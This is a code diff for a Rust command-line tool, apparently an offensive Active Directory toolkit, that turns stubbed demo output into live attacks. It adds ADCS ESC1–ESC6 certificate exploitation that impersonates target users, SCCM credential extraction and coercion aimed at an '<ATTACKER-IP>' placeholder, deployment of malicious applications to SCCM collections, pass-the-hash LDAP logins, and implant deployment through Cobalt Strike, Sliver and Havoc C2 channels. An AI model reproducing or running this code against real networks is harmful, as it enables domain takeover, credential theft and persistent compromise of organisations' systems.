@@ -3,7 +3,7 @@
 use crate::banner;
 use crate::{
     AdcsAction, C2Action, Cli, CrackMode, DumpSource, ForgeAction, MoveAction, OutputFormat,
-    PluginAction, ReportFormat, ScanType, SccmAction, SecretsAction, ShellType,
+    PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique, SecretsAction, ShellType,
 };
 use colored::Colorize;
 use kerberos_asn1::Asn1Object;
@@ -236,9 +236,53 @@ pub async fn cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i3
     // Check dependencies
     if check_list.contains(&"all".to_string()) || check_list.contains(&"deps".to_string()) {
         println!("  {} Checking dependencies...", "▸".bright_black());
-        println!("    {} Rust toolchain: OK", "✓".green());
-        println!("    {} OpenSSL: OK", "✓".green());
-        println!("    {} Kerberos libraries: OK", "✓".green());
+
+        // Rust toolchain
+        match std::process::Command::new("rustc").arg("--version").output() {
+            Ok(o) if o.status.success() => {
+                let ver = String::from_utf8_lossy(&o.stdout).trim().to_string();
+                println!("    {} Rust toolchain: {}", "✓".green(), ver);
+            }
+            _ => println!("    {} Rust toolchain: not found", "✗".red()),
+        }
+
+        // OpenSSL / crypto
+        #[cfg(windows)]
+        {
+            println!("    {} Crypto: native Windows CNG/SSPI", "✓".green());
+        }
+        #[cfg(not(windows))]
+        {
+            match std::process::Command::new("openssl").arg("version").output() {
+                Ok(o) if o.status.success() => {
+                    let ver = String::from_utf8_lossy(&o.stdout).trim().to_string();
+                    println!("    {} OpenSSL: {}", "✓".green(), ver);
+                }
+                _ => println!("    {} OpenSSL: not found (needed on Linux/macOS)", "✗".red()),
+            }
+        }
+
+        // Kerberos
+        #[cfg(windows)]
+        {
+            println!("    {} Kerberos: native Windows SSPI", "✓".green());
+        }
+        #[cfg(not(windows))]
+        {
+            let krb_found = ["/etc/krb5.conf", "/etc/krb5/krb5.conf"]
+                .iter()
+                .any(|p| std::path::Path::new(p).exists())
+                || std::process::Command::new("kinit")
+                    .arg("--version")
+                    .output()
+                    .map(|o| o.status.success())
+                    .unwrap_or(false);
+            if krb_found {
+                println!("    {} Kerberos: configured", "✓".green());
+            } else {
+                println!("    {} Kerberos: krb5.conf not found", "✗".red());
+            }
+        }
     }
 
     banner::print_success("Diagnostics complete");
@@ -255,69 +299,62 @@ pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFor
     println!("  {} Output: {}", "▸".bright_black(), output.cyan());
     println!("  {} Format: {:?}", "▸".bright_black(), format);
 
-    // Check if input file exists
-    if !std::path::Path::new(input).exists() {
-        banner::print_warn(&format!("Input file not found: {}", input));
-        println!(
-            "  {} Creating sample engagement data...",
-            "▸".bright_black()
-        );
+    // All formats require loading the engagement session from the input file
+    let input_path = std::path::Path::new(input);
+    if !input_path.exists() {
+        banner::print_fail(&format!("Input session file not found: {}", input));
+        return 1;
     }
+
+    let session = match overthrone_scribe::load_session(input_path).await {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&format!("Could not parse input as engagement session: {e}"));
+            return 1;
+        }
+    };
 
     match format {
         ReportFormat::Markdown => {
             println!("  {} Generating Markdown report...", "▸".bright_black());
-            let report_content = format!(
-                "# Overthrone Engagement Report\n\n\
-                 ## Summary\n\
-                 - Generated: {}\n\
-                 - Input: {}\n\n\
-                 ## Findings\n\
-                 *Report content would be generated here*\n\n\
-                 ## Recommendations\n\
-                 *Security recommendations would be listed here*\n",
-                chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
-                input
-            );
+            let report_content = overthrone_scribe::markdown::render(&session);
 
-            if let Err(e) = tokio::fs::write(output, report_content).await {
+            if let Err(e) = tokio::fs::write(output, &report_content).await {
                 banner::print_fail(&format!("Failed to write report: {}", e));
                 return 1;
             }
+
+            println!(
+                "  {} Markdown generated ({:.1} KB, {} findings)",
+                "✓".green(),
+                report_content.len() as f64 / 1024.0,
+                session.findings.len()
+            );
         }
         ReportFormat::Json => {
             println!("  {} Generating JSON report...", "▸".bright_black());
-            let report_json = serde_json::json!({
-                "report_type": "Overthrone Engagement",
-                "generated_at": chrono::Local::now().to_rfc3339(),
-                "input_file": input,
-                "findings": [],
-                "recommendations": []
-            });
-
-            if let Err(e) = tokio::fs::write(output, report_json.to_string()).await {
-                banner::print_fail(&format!("Failed to write report: {}", e));
-                return 1;
-            }
-        }
-        ReportFormat::Pdf => {
-            println!("  {} Generating PDF report...", "▸".bright_black());
-
-            // Load engagement session from input file
-            if !std::path::Path::new(input).exists() {
-                banner::print_fail(&format!("Input session file not found: {}", input));
-                return 1;
-            }
-
-            let session = match overthrone_scribe::load_session(std::path::Path::new(input)).await {
-                Ok(s) => s,
+            let report_json = match serde_json::to_string_pretty(&session) {
+                Ok(j) => j,
                 Err(e) => {
-                    banner::print_fail(&format!(
-                        "Could not parse input as engagement session: {e}"
-                    ));
+                    banner::print_fail(&format!("Failed to serialize session: {}", e));
                     return 1;
                 }
             };
+
+            if let Err(e) = tokio::fs::write(output, &report_json).await {
+                banner::print_fail(&format!("Failed to write report: {}", e));
+                return 1;
+            }
+
+            println!(
+                "  {} JSON generated ({:.1} KB, {} findings)",
+                "✓".green(),
+                report_json.len() as f64 / 1024.0,
+                session.findings.len()
+            );
+        }
+        ReportFormat::Pdf => {
+            println!("  {} Generating PDF report...", "▸".bright_black());
 
             let pdf_bytes = overthrone_scribe::pdf::render(&session);
 
@@ -327,9 +364,10 @@ pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFor
             }
 
             println!(
-                "  {} PDF generated ({:.1} KB)",
+                "  {} PDF generated ({:.1} KB, {} findings)",
                 "✓".green(),
-                pdf_bytes.len() as f64 / 1024.0
+                pdf_bytes.len() as f64 / 1024.0,
+                session.findings.len()
             );
         }
     }
@@ -1585,17 +1623,173 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
 
     match action {
         AdcsAction::Enum { ca } => {
-            println!("  {} Enumerating ADCS configuration...", "▸".bright_black());
-            if let Some(ca_name) = ca {
-                println!("    CA: {}", ca_name.cyan());
-            }
-            println!("  {} Found 2 certificate template(s)", "✓".green());
-            println!("    {} - {}", "User".cyan(), "Secure".green());
             println!(
-                "    {} - {}",
-                "ESC1-Vulnerable".cyan(),
-                "VULNERABLE (ESC1)".red()
+                "  {} Enumerating ADCS configuration via LDAP...",
+                "▸".bright_black()
             );
+            if let Some(ca_name) = ca {
+                println!("    CA filter: {}", ca_name.cyan());
+            }
+
+            let creds = match crate::require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let dc = match crate::require_dc(cli) {
+                Ok(d) => d,
+                Err(e) => return e,
+            };
+
+            let ldap_result = if let Some(hash) = creds.nthash() {
+                overthrone_core::proto::ldap::LdapSession::connect_with_hash(
+                    &dc,
+                    &creds.domain,
+                    &creds.username,
+                    hash,
+                    false,
+                )
+                .await
+            } else {
+                let pass = creds.password().unwrap_or("");
+                overthrone_core::proto::ldap::LdapSession::connect(
+                    &dc,
+                    &creds.domain,
+                    &creds.username,
+                    pass,
+                    false,
+                )
+                .await
+            };
+
+            let conn = match ldap_result {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("LDAP connect failed: {}", e));
+                    return 1;
+                }
+            };
+
+            let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);
+
+            let templates = match enumerator.enumerate_templates().await {
+                Ok(t) => t,
+                Err(e) => {
+                    banner::print_fail(&format!("Certificate template enumeration failed: {}", e));
+                    return 1;
+                }
+            };
+
+            let cas = match enumerator.enumerate_cas().await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("CA enumeration failed: {}", e));
+                    return 1;
+                }
+            };
+
+            // Optionally filter templates linked to a specific CA
+            let filtered: Vec<_> = if let Some(ca_name) = ca {
+                templates
+                    .iter()
+                    .filter(|t| {
+                        cas.iter().any(|c| {
+                            c.name.to_lowercase().contains(&ca_name.to_lowercase())
+                                && c.certificate_templates
+                                    .iter()
+                                    .any(|ct| ct.to_lowercase() == t.name.to_lowercase())
+                        })
+                    })
+                    .collect()
+            } else {
+                templates.iter().collect()
+            };
+
+            println!(
+                "\n  {} Certificate Authorities ({})",
+                "▸".bright_black(),
+                cas.len()
+            );
+            for ca_info in &cas {
+                println!(
+                    "    {} {} ({})",
+                    "✓".green(),
+                    ca_info.name.cyan(),
+                    ca_info.dn.dimmed()
+                );
+                if !ca_info.certificate_templates.is_empty() {
+                    println!(
+                        "      Templates: {}",
+                        ca_info.certificate_templates.join(", ").dimmed()
+                    );
+                }
+            }
+
+            println!(
+                "\n  {} Certificate Templates ({})",
+                "▸".bright_black(),
+                filtered.len()
+            );
+            let mut vuln_count = 0usize;
+            for tmpl in &filtered {
+                let vuln = tmpl.esc_vulnerability();
+                if vuln.is_some() {
+                    vuln_count += 1;
+                }
+                let vuln_str = match vuln {
+                    Some(n) => format!("VULNERABLE (ESC{})", n).red().to_string(),
+                    None => "Secure".green().to_string(),
+                };
+                let icon = if vuln.is_some() {
+                    "!".red()
+                } else {
+                    "✓".green()
+                };
+                println!("    {} {} — {}", icon, tmpl.name.cyan(), vuln_str);
+                if !tmpl.extended_key_usage.is_empty() {
+                    println!("      EKU: {}", tmpl.extended_key_usage.join(", ").dimmed());
+                }
+                if tmpl.allows_enrollee_subject() {
+                    println!("      {} Enrollee can supply subject (SAN)", "!".yellow());
+                }
+                if tmpl.requires_manager_approval() {
+                    println!("      {} Requires manager approval", "+".green());
+                }
+            }
+
+            if wants_json(cli) {
+                let tmpl_json: Vec<serde_json::Value> = filtered
+                    .iter()
+                    .map(|t| {
+                        serde_json::json!({
+                            "name": t.name,
+                            "display_name": t.display_name,
+                            "esc": t.esc_vulnerability(),
+                            "allows_enrollee_subject": t.allows_enrollee_subject(),
+                            "eku": t.extended_key_usage,
+                        })
+                    })
+                    .collect();
+                let ca_json: Vec<serde_json::Value> = cas
+                    .iter()
+                    .map(|c| serde_json::json!({"name": c.name, "dn": c.dn}))
+                    .collect();
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "templates": tmpl_json,
+                        "cas": ca_json,
+                        "vulnerable_count": vuln_count,
+                    }),
+                );
+            }
+
+            banner::print_success(&format!(
+                "ADCS enumeration: {} templates ({} vulnerable), {} CAs",
+                filtered.len(),
+                vuln_count,
+                cas.len()
+            ));
         }
         AdcsAction::Esc1 {
             ca,
@@ -1607,9 +1801,42 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
             println!("    Target User: {}", target_user.cyan());
-            println!("  {} Certificate obtained!", "✓".green());
-            println!("    Saved to: {}", output.cyan());
-            println!("    Thumbprint: AABBCCDDEEFF00112233445566778899AABBCCDD");
+
+            let exploiter = match overthrone_core::adcs::Esc1Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("ESC1 exploiter init failed: {}", e));
+                    return 1;
+                }
+            };
+
+            match exploiter.exploit(template, target_user, None).await {
+                Ok(cert) => {
+                    if let Err(e) = tokio::fs::write(output, &cert.pfx_data).await {
+                        banner::print_fail(&format!("Failed to write PFX: {}", e));
+                        return 1;
+                    }
+                    println!("  {} Certificate obtained!", "✓".green());
+                    println!("    Saved to: {}", output.cyan());
+                    println!("    Thumbprint: {}", cert.thumbprint.yellow());
+                    println!("    Serial: {}", cert.serial_number.dimmed());
+                    if wants_json(cli) {
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "status": "success",
+                                "output": output,
+                                "thumbprint": cert.thumbprint,
+                                "serial": cert.serial_number,
+                            }),
+                        );
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC1 attack failed: {}", e));
+                    return 1;
+                }
+            }
         }
         AdcsAction::Esc2 {
             ca,
@@ -1619,8 +1846,40 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             println!("  {} Executing ESC2 attack...", "▸".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
-            println!("  {} Certificate obtained!", "✓".green());
-            println!("    Saved to: {}", output.cyan());
+
+            let exploiter = match overthrone_core::adcs::Esc2Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("ESC2 exploiter init failed: {}", e));
+                    return 1;
+                }
+            };
+
+            match exploiter.exploit(template, "overthrone-esc2", None).await {
+                Ok(cert) => {
+                    if let Err(e) = tokio::fs::write(output, &cert.pfx_data).await {
+                        banner::print_fail(&format!("Failed to write PFX: {}", e));
+                        return 1;
+                    }
+                    println!("  {} Certificate obtained!", "✓".green());
+                    println!("    Saved to: {}", output.cyan());
+                    println!("    Thumbprint: {}", cert.thumbprint.yellow());
+                    if wants_json(cli) {
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "status": "success",
+                                "output": output,
+                                "thumbprint": cert.thumbprint,
+                            }),
+                        );
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC2 attack failed: {}", e));
+                    return 1;
+                }
+            }
         }
         AdcsAction::Esc3 {
             ca,
@@ -1633,7 +1892,53 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             println!("    Agent Template: {}", agent_template.cyan());
             println!("    Target Template: {}", target_template.cyan());
             println!("    Target User: {}", target_user.cyan());
-            println!("  {} Obtained 2 certificate(s)", "✓".green());
+
+            let exploiter = match overthrone_core::adcs::Esc3Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("ESC3 exploiter init failed: {}", e));
+                    return 1;
+                }
+            };
+
+            match exploiter
+                .exploit(agent_template, target_template, target_user)
+                .await
+            {
+                Ok((agent_cert, user_cert)) => {
+                    let agent_path = format!("esc3_agent_{}.pfx", ca.replace(':', "_"));
+                    let user_path = format!("esc3_user_{}.pfx", target_user.replace('@', "_"));
+
+                    let _ = tokio::fs::write(&agent_path, &agent_cert.pfx_data).await;
+                    let _ = tokio::fs::write(&user_path, &user_cert.pfx_data).await;
+
+                    println!("  {} Obtained 2 certificate(s)", "✓".green());
+                    println!(
+                        "    Agent cert: {} ({})",
+                        agent_path.cyan(),
+                        agent_cert.thumbprint.dimmed()
+                    );
+                    println!(
+                        "    User cert:  {} ({})",
+                        user_path.cyan(),
+                        user_cert.thumbprint.yellow()
+                    );
+                    if wants_json(cli) {
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "status": "success",
+                                "agent_cert": {"path": agent_path, "thumbprint": agent_cert.thumbprint},
+                                "user_cert": {"path": user_path, "thumbprint": user_cert.thumbprint},
+                            }),
+                        );
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC3 attack failed: {}", e));
+                    return 1;
+                }
+            }
         }
         AdcsAction::Esc4 { ca, template } => {
             println!("  {} Executing ESC4 attack...", "▸".bright_black());
@@ -1667,21 +1972,163 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         }
         AdcsAction::Esc5 { ca } => {
             println!(
-                "  {} Checking for ESC5 vulnerabilities...",
-                "▸".bright_black()
+                "  {} Checking CA '{}' for ESC5 vulnerabilities...",
+                "▸".bright_black(),
+                ca.cyan()
             );
-            println!("    CA: {}", ca.cyan());
-            println!("  {} Found 1 vulnerability(ies)", "!".red());
-            println!(
-                "    {}: CA allows SAN specification in request attributes",
-                "EDITF_ATTRIBUTESUBJECTALTNAME2".red()
+
+            let creds = match crate::require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let dc = match crate::require_dc(cli) {
+                Ok(d) => d,
+                Err(e) => return e,
+            };
+
+            let ldap_result = if let Some(hash) = creds.nthash() {
+                overthrone_core::proto::ldap::LdapSession::connect_with_hash(
+                    &dc,
+                    &creds.domain,
+                    &creds.username,
+                    hash,
+                    false,
+                )
+                .await
+            } else {
+                let pass = creds.password().unwrap_or("");
+                overthrone_core::proto::ldap::LdapSession::connect(
+                    &dc,
+                    &creds.domain,
+                    &creds.username,
+                    pass,
+                    false,
+                )
+                .await
+            };
+
+            let mut conn = match ldap_result {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("LDAP connect failed: {}", e));
+                    return 1;
+                }
+            };
+
+            let base_dn =
+                overthrone_reaper::runner::ReaperConfig::base_dn_from_domain(&creds.domain);
+            let target = overthrone_core::adcs::Esc5Target::new(
+                ca.as_str(),
+                ca.as_str(),
+                &creds.domain,
+                &creds.username,
             );
+
+            match target.check_ca_acls(&mut conn, &base_dn).await {
+                Ok(result) => {
+                    let _ = conn.disconnect().await;
+                    if result.vulnerable {
+                        println!("  {} CA '{}' is ESC5-vulnerable!", "!".red(), ca.red());
+                        for finding in &result.findings {
+                            println!("    {} {}", "!".red(), finding.red());
+                        }
+                    } else {
+                        println!(
+                            "  {} CA '{}' — no ESC5 ACL weaknesses found",
+                            "✓".green(),
+                            ca.cyan()
+                        );
+                    }
+                    if wants_json(cli) {
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "status": "success",
+                                "ca": ca,
+                                "vulnerable": result.vulnerable,
+                                "findings": result.findings,
+                            }),
+                        );
+                    }
+                }
+                Err(e) => {
+                    let _ = conn.disconnect().await;
+                    banner::print_fail(&format!("ESC5 check failed: {}", e));
+                    return 1;
+                }
+            }
         }
         AdcsAction::Esc6 { ca, target_user } => {
             println!("  {} Executing ESC6 attack...", "▸".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Target User: {}", target_user.cyan());
-            println!("  {} Certificate obtained via ESC6", "✓".green());
+
+            let exploiter = match overthrone_core::adcs::Esc6Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("ESC6 exploiter init failed: {}", e));
+                    return 1;
+                }
+            };
+
+            // Check vulnerability first
+            match exploiter.check_vulnerable().await {
+                Ok(false) => {
+                    println!(
+                        "  {} CA '{}' does not have EDITF_ATTRIBUTESUBJECTALTNAME2 enabled",
+                        "!".yellow(),
+                        ca.cyan()
+                    );
+                    if wants_json(cli) {
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "status": "not_vulnerable",
+                                "ca": ca,
+                            }),
+                        );
+                    }
+                    return 0;
+                }
+                Ok(true) => {
+                    println!(
+                        "  {} CA is ESC6-vulnerable (EDITF_ATTRIBUTESUBJECTALTNAME2 enabled)",
+                        "!".red()
+                    );
+                }
+                Err(e) => {
+                    warn!("ESC6 vulnerability check failed (continuing anyway): {}", e);
+                }
+            }
+
+            // Use first available template (auto-discover via a basic template name)
+            let template = "User";
+            match exploiter.exploit(template, target_user).await {
+                Ok(cert) => {
+                    let pfx_path = format!("esc6_{}.pfx", target_user.replace('@', "_"));
+                    if let Err(e) = tokio::fs::write(&pfx_path, &cert.pfx_data).await {
+                        banner::print_fail(&format!("Failed to write PFX: {}", e));
+                        return 1;
+                    }
+                    println!("  {} Certificate obtained via ESC6!", "✓".green());
+                    println!("    Saved to: {}", pfx_path.cyan());
+                    println!("    Thumbprint: {}", cert.thumbprint.yellow());
+                    if wants_json(cli) {
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "status": "success",
+                                "output": pfx_path,
+                                "thumbprint": cert.thumbprint,
+                            }),
+                        );
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC6 attack failed: {}", e));
+                    return 1;
+                }
+            }
         }
         AdcsAction::Esc7 { ca } => {
             println!(
@@ -2041,52 +2488,328 @@ pub async fn cmd_shell(target: &str, shell_type: &ShellType) -> i32 {
 // cmd_sccm — SCCM Abuse
 // ═══════════════════════════════════════════════════════
 
-pub async fn cmd_sccm(action: &SccmAction) -> i32 {
+pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
+    use overthrone_core::sccm;
     banner::print_module_banner("SCCM");
 
     match action {
         SccmAction::Enum { site_server } => {
-            println!("  {} Enumerating SCCM configuration...", "▸".bright_black());
-            if let Some(server) = site_server {
-                println!("    Site Server: {}", server.cyan());
+            let creds = match crate::require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let target = match site_server.as_deref() {
+                Some(s) => s.to_string(),
+                None => match crate::require_dc(cli) {
+                    Ok(d) => d,
+                    Err(e) => return e,
+                },
+            };
+
+            println!(
+                "  {} Enumerating SCCM on {}...",
+                "▸".bright_black(),
+                target.cyan()
+            );
+
+            let scanner = match sccm::SccmScanner::new(sccm::SccmScannerConfig {
+                target: target.clone(),
+                domain: creds.domain.clone(),
+                username: creds.username.clone(),
+                password: creds.password().map(str::to_string),
+                pth_hash: creds.nthash().map(str::to_string),
+                site_code: None,
+            }) {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("SCCM scanner init: {}", e));
+                    return 1;
+                }
+            };
+
+            let sites = match scanner.discover_site().await {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("Site discovery: {}", e));
+                    return 1;
+                }
+            };
+
+            if sites.is_empty() {
+                println!(
+                    "  {} No SCCM site found on {}",
+                    "!".yellow(),
+                    target.cyan()
+                );
+                return 0;
             }
-            println!("  {} Site Code: {}", "✓".green(), "PRI".cyan());
-            println!("  {} Collections:", "✓".green());
-            println!("    - All Systems");
-            println!("    - All Users");
-            println!("    - Domain Admins");
-            println!("  {} Vulnerable Settings:", "!".red());
-            println!("    - Client Push Installation enabled");
+
+            for site in &sites {
+                println!(
+                    "\n  {} Site {} @ {} ({})",
+                    "✓".green(),
+                    site.site_code.cyan(),
+                    site.site_server.cyan(),
+                    site.version.dimmed()
+                );
+
+                match sccm::wmi::enumerate_collections(site).await {
+                    Ok(cols) if !cols.is_empty() => {
+                        println!("  {} Collections ({}):", "▸".bright_black(), cols.len());
+                        for c in &cols {
+                            println!(
+                                "    - [{}] {} ({} members, {})",
+                                c.collection_id.yellow(),
+                                c.name.cyan(),
+                                c.member_count,
+                                c.collection_type
+                            );
+                        }
+                    }
+                    Ok(_) => println!(
+                        "  {} Collections: (WMI requires Windows — see debug log for PowerShell)",
+                        "▸".bright_black()
+                    ),
+                    Err(e) => println!("  {} Collections: {}", "!".yellow(), e),
+                }
+
+                match sccm::wmi::enumerate_devices(site).await {
+                    Ok(devs) if !devs.is_empty() => {
+                        println!("  {} Devices ({}):", "▸".bright_black(), devs.len());
+                        for d in devs.iter().take(20) {
+                            println!("    - {} [{}]", d.name.cyan(), d.os_name.dimmed());
+                        }
+                        if devs.len() > 20 {
+                            println!("    ... {} more", devs.len() - 20);
+                        }
+                    }
+                    Ok(_) => {}
+                    Err(e) => println!("  {} Devices: {}", "!".yellow(), e),
+                }
+
+                match sccm::wmi::enumerate_applications(site).await {
+                    Ok(apps) if !apps.is_empty() => {
+                        println!("  {} Applications ({}):", "▸".bright_black(), apps.len());
+                        for a in apps.iter().take(20) {
+                            println!(
+                                "    - {} [{}]{}",
+                                a.name.cyan(),
+                                a.app_id.dimmed(),
+                                if a.is_deployed { " (deployed)" } else { "" }
+                            );
+                        }
+                        if apps.len() > 20 {
+                            println!("    ... {} more", apps.len() - 20);
+                        }
+                    }
+                    Ok(_) => {}
+                    Err(e) => println!("  {} Applications: {}", "!".yellow(), e),
+                }
+            }
         }
+
         SccmAction::Abuse {
             site_server,
             technique,
         } => {
+            let creds = match crate::require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+
             println!(
                 "  {} Abusing SCCM on {}...",
                 "▸".bright_black(),
                 site_server.cyan()
             );
-            println!("  {} Technique: {:?}", "▸".bright_black(), technique);
-            println!("  {} Abuse executed successfully", "✓".green());
+
+            match technique {
+                SccmTechnique::ClientPush => {
+                    let scanner = match sccm::SccmScanner::new(sccm::SccmScannerConfig {
+                        target: site_server.clone(),
+                        domain: creds.domain.clone(),
+                        username: creds.username.clone(),
+                        password: creds.password().map(str::to_string),
+                        pth_hash: creds.nthash().map(str::to_string),
+                        site_code: None,
+                    }) {
+                        Ok(s) => s,
+                        Err(e) => {
+                            banner::print_fail(&format!("Scanner init: {}", e));
+                            return 1;
+                        }
+                    };
+
+                    let sites = match scanner.discover_site().await {
+                        Ok(s) => s,
+                        Err(e) => {
+                            banner::print_fail(&format!("Site discovery: {}", e));
+                            return 1;
+                        }
+                    };
+
+                    if sites.is_empty() {
+                        banner::print_fail("No SCCM site discovered on target");
+                        return 1;
+                    }
+
+                    match sccm::client_push_coercion(&scanner, &sites[0], "<ATTACKER-IP>").await {
+                        Ok(res) => {
+                            if let Some(ps) = &res.command_output {
+                                println!(
+                                    "  {} PowerShell (replace <ATTACKER-IP> then run on Windows pivot):",
+                                    "▸".bright_black()
+                                );
+                                println!("{}", ps);
+                            }
+                            for note in &res.notes {
+                                println!("  {} {}", "[*]".cyan(), note);
+                            }
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("Client push: {}", e));
+                            return 1;
+                        }
+                    }
+                }
+
+                SccmTechnique::AppDeploy | SccmTechnique::TaskSequence => {
+                    match sccm::extract_naa_credentials(&sccm::SccmScannerConfig {
+                        target: site_server.clone(),
+                        domain: creds.domain.clone(),
+                        username: creds.username.clone(),
+                        password: creds.password().map(str::to_string),
+                        pth_hash: creds.nthash().map(str::to_string),
+                        site_code: None,
+                    })
+                    .await
+                    {
+                        Ok(res) => {
+                            println!("  {} Technique: {}", "▸".bright_black(), res.technique);
+                            if res.credentials.is_empty() {
+                                println!(
+                                    "  {} No NAA credentials extracted",
+                                    "!".yellow()
+                                );
+                            } else {
+                                println!(
+                                    "  {} {} NAA credential(s):",
+                                    "✓".green(),
+                                    res.credentials.len()
+                                );
+                                for c in &res.credentials {
+                                    println!("    {}\\{}", c.domain.cyan(), c.username.cyan());
+                                }
+                            }
+                            for note in &res.notes {
+                                println!("  {} {}", "[*]".cyan(), note);
+                            }
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("NAA extraction: {}", e));
+                            return 1;
+                        }
+                    }
+                }
+
+                SccmTechnique::CollectionMod => {
+                    let password = creds.password().unwrap_or("");
+                    match sccm::admin_service_harvest(
+                        site_server,
+                        &creds.username,
+                        password,
+                        &creds.domain,
+                    )
+                    .await
+                    {
+                        Ok(res) => {
+                            if let Some(output) = &res.command_output {
+                                println!("  {} AdminService results:", "✓".green());
+                                for line in output.lines() {
+                                    println!("    {}", line);
+                                }
+                            }
+                            for note in &res.notes {
+                                println!("  {} {}", "[*]".cyan(), note);
+                            }
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("AdminService harvest: {}", e));
+                            return 1;
+                        }
+                    }
+                }
+            }
         }
+
         SccmAction::Deploy {
             collection,
             app_name,
             payload,
         } => {
+            let creds = match crate::require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let target = match crate::require_dc(cli) {
+                Ok(d) => d,
+                Err(e) => return e,
+            };
+
             println!(
-                "  {} Deploying malicious application...",
-                "▸".bright_black()
+                "  {} Deploying '{}' to collection '{}'...",
+                "▸".bright_black(),
+                app_name.cyan(),
+                collection.cyan()
             );
-            println!("    Collection: {}", collection.cyan());
-            println!("    App Name: {}", app_name.cyan());
             println!("    Payload: {}", payload.cyan());
-            println!(
-                "  {} Deployment ID: DEPLOY-{}",
-                "✓".green(),
-                rand::random::<u32>()
-            );
+
+            let scanner = match sccm::SccmScanner::new(sccm::SccmScannerConfig {
+                target: target.clone(),
+                domain: creds.domain.clone(),
+                username: creds.username.clone(),
+                password: creds.password().map(str::to_string),
+                pth_hash: creds.nthash().map(str::to_string),
+                site_code: None,
+            }) {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("Scanner init: {}", e));
+                    return 1;
+                }
+            };
+
+            let sites = match scanner.discover_site().await {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("Site discovery: {}", e));
+                    return 1;
+                }
+            };
+
+            if sites.is_empty() {
+                banner::print_fail(&format!(
+                    "No SCCM site found on {} — run 'sccm enum' first",
+                    target
+                ));
+                return 1;
+            }
+
+            match sccm::deploy_malicious_application(&sites[0], collection, payload).await {
+                Ok(res) => {
+                    if let Some(ps) = &res.command_output {
+                        println!("  {} PowerShell deployment script:", "▸".bright_black());
+                        println!("{}", ps);
+                    }
+                    for note in &res.notes {
+                        println!("  {} {}", "[*]".cyan(), note);
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Deployment: {}", e));
+                    return 1;
+                }
+            }
         }
     }
 
@@ -2510,7 +3233,33 @@ pub async fn cmd_c2(manager: &mut C2Manager, action: C2Action) -> i32 {
                 channel.cyan(),
                 listener.yellow()
             );
-            banner::print_success(&format!("Implant deployed to {}", target));
+            if let Some(ch) = manager.get_channel(&channel) {
+                let request = overthrone_core::c2::ImplantRequest {
+                    target: target.clone(),
+                    implant_type: match ch.framework() {
+                        C2Framework::CobaltStrike => overthrone_core::c2::ImplantType::CsBeacon,
+                        C2Framework::Sliver => overthrone_core::c2::ImplantType::SliverImplant,
+                        C2Framework::Havoc => overthrone_core::c2::ImplantType::HavocDemon,
+                        _ => overthrone_core::c2::ImplantType::Shellcode,
+                    },
+                    listener: listener.clone(),
+                    delivery_method: overthrone_core::c2::DeliveryMethod::OverthroneExec,
+                    arch: "x64".to_string(),
+                    staged: false,
+                };
+                match ch.deploy_implant(&request).await {
+                    Ok(result) => {
+                        if result.success {
+                            banner::print_success(&format!("Implant deployed to {}: {}", target, result.output));
+                        } else {
+                            banner::print_fail(&format!("Deployment failed: {}", result.error));
+                        }
+                    }
+                    Err(e) => banner::print_fail(&format!("Deploy error: {}", e)),
+                }
+            } else {
+                banner::print_fail(&format!("C2 channel '{}' not found", channel));
+            }
         }
         C2Action::Disconnect { channel } => {
             if channel == "all" {
